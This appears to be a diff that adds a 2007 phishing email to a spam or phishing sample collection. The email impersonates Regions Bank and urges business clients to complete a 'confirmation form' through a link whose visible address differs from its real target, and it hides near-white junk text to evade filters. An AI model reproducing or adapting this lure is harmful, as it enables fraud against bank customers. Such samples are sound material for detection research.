@@ -1,0 +1,68 @@
+From nobody Sun Jan 25 13:49:57 2015
+Return-Path: <customerservice.ref150343192326162.cm@regions.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 1F04D2A894
+ for <user@example.com>; Sun, 13 May 2007 03:44:12 -0400 (EDT)
+Received: from mail.example.com (mail.example.com [192.168.1.2])
+ by mail.example.com (Example mail relay) with ESMTP id 02907621C95
+ for <user@example.com>; Sun, 13 May 2007 03:44:12 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id CAFC816253; Sun, 13 May 2007 03:53:31 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from 151-moc-9.acn.waw.pl (151-moc-9.acn.waw.pl [212.76.54.151])
+ by mail.example.com (Example mail relay) with SMTP id 500321624C
+ for <user@example.com>; Sun, 13 May 2007 03:53:29 -0400 (EDT)
+Received: from canvasback.infobel.com (helo rb-net.com.adobe.com
+ [136.180.112.99]) by startua.com with SMTP id ZHWBVRNZD3
+ for <user@example.com>; Sun, 13 May 2007 03:44:00 -0500
+Received: from abuilding.malaysia.net (HELO homunculus.malaysia.net
+ [48.8.197.96]) by farpost.com with SMTP id 7UP3HKQINP
+ for <user@example.com>; Sun, 13 May 2007 13:44:00 +0500
+XAuthentication-Warning: ZGP16-joanne33.LFD294xy.[101.134.208.195] (HELO
+ getcyberhost.com): aje804miasma set sender to
+ service.refBF16373553088LK.cm@regions.com using -c
+From: "Regions Bank" <customerservice.ref150343192326162.cm@regions.com>
+To: user <user@example.com>
+Subject: Regions Bank: Confirmation Required!
+XAuthentication-Warning: ZGP16-joanne33.LFD294xy.[101.134.208.195] (HELO
+ getcyberhost.com): aje804miasma set sender to
+ service.refBF16373553088LK.cm@regions.com using -c
+User-Agent: Mozilla 4.61 [en]C-CCK-MCD C-UDP; (Win98; I)
+X-Mailer: Mozilla 4.61 [en]C-CCK-MCD C-UDP; (Win98; I)
+X-Priority: 3 (Normal)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--L4686H_JS74C57D"
+Message-Id: <20070513075329.500321624C@mail.example.com>
+Date: Sun, 13 May 2007 03:53:29 -0400 (EDT)
+X-Keywords: 
+Status: O
+Content-Length: 3421
+Lines: 25
+
+----L4686H_JS74C57D
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
+
+<head>
+<meta http-equiv="Content-Type" content="text/html;    charset=iso-8859-1"   />
+</head>
+
+<body>
+<p><font   face="Arial">Dear      business     client of  <b>Regions    Bank</b>:</font></p>
+<p><font     face="Arial">The      Regions     Customer   Service  requests      you   to      complete       the  Regions     InterAct       Confirmation    Form.</font></p>
+<p><font   face="Arial">This    procedure  is       obligatory    for       all   business   and      corporate     clients       of      Regions     Bank.</font></p>
+<p><font   face="Arial">Please  select       the hyperlink   and   visit      the   address       listed to   access  the     Regions      InterAct       Confirmation    Form.</font><br>
+</p><p><font    face="Arial"><a href="http://interactsession-800889731.regions.com.myplo.at/ibsregions/cmserver/iform.cfm">http://interactsession-800889731.regions.com/ibsregions/cmserver/iform.cfm</a></font></p>
+<p><font       face="Arial">Again,    thank      you    for       choosing Regions      Bank for     your     business    needs. We   look   forward      to      working       with     you.</font></p>
+<p><font face="Arial">***** Please  do       not      respond    to       this       email *****</font></p><p><font    face="Arial">This     mail      is      generated  by    an     automated   service.<br>
+Replies       to       this    mail  are       not       read by  Regions   Bank  customer  service   or technical   support.</font><br></p>
+<p>------------------------------------------------------------------------------------------------------</p>
+<p><font    color="#FFFFFB"   face="Arial">rev: 0x3     api, 5WF, api, hex, 03EV, I2DY.   1VMP: 0x41, 0x9, 0x148, 0x495, 0x186      7HBQ: 0x400, 0x02849404, 0x335, 0x071, 0x16, 0x40260537, 0x64, 0x88, 0x8 0x4, 0x2, 0x09129353, 0x8282, 0x18972789, 0x15     0x03, 0x0, 0x37539463, 0x0876, 0x5, 0x6, 0x32, 0x446, 0x4, 0x21, 0x8156, 0x94522459, 0x79598751 E5FT: 0x446, 0x2943, 0x2010, 0x40910462, 0x262, 0x69, 0x956  0x09101283, 0x5247    0x08962678, 0x23004469, 0x69, 0x80116116, 0x55, 0x01, 0x8946, 0x16</font></p><p><font  color="#FFFFF8"    face="Arial"><span>SPN: 0x742, 0x0411, 0x1, 0x53   0x085, 0x355, 0x2    TLYQ: 0x50, 0x4125, 0x5108, 0x2, 0x1018, 0x3, 0x0    rcs, interface start, KP1 0x75805781, 0x8, 0x966    0x9762, 0x9, 0x018, 0x348, 0x122, 0x12895024     </span><span>4HR.      0x119, 0x5, 0x85941553, 0x24262465, 0x64, 0x1, 0x3 0x34499594, 0x0, 0x45222245, 0x36 0x2, 0x77, 0x124, 0x98650792, 0x6535, 0x0, 0x48, 0x9, 0x881, 0x8125, 0x90, 0x56644692, 0x4, 0x07</span></font></p>
+<p><font  color="#FFFFFD"      face="Arial"><span>0x06923884, 0x75, 0x22606406, 0x07, 0x440, 0x89, 0x20698463, 0x543, 0x044      0x7369, 0x1, 0x6288, 0x6, 0x7293, 0x945, 0x4145, 0x66, 0x2056      49Q: 0x276, 0x835, 0x509, 0x70068540, 0x033, 0x9, 0x22559124, 0x39691030   XCI4: 0x9, 0x0, 0x42, 0x65754015, 0x0767, 0x195, 0x451, 0x587, 0x3, 0x009, 0x844, 0x82705101, 0x676, 0x6385   hex, dec, FKZ, stack, common, exe, rcs, cvs</span><span>type: 0x45465663, 0x401, 0x515, 0x95, 0x6880, 0x8, 0x6803     </span><span>tmp: 0x170, 0x5, 0x7, 0x160, 0x4, 0x7  interface: 0x423, 0x3479, 0x1, 0x37434914, 0x2, 0x41, 0x7, 0x96408937, 0x9416 DUS GGB root QSAP NOE KA3  include: 0x5, 0x1741, 0x69149879, 0x9272</span></font></p>
+</body>
+</html>
+
+
+----L4686H_JS74C57D--
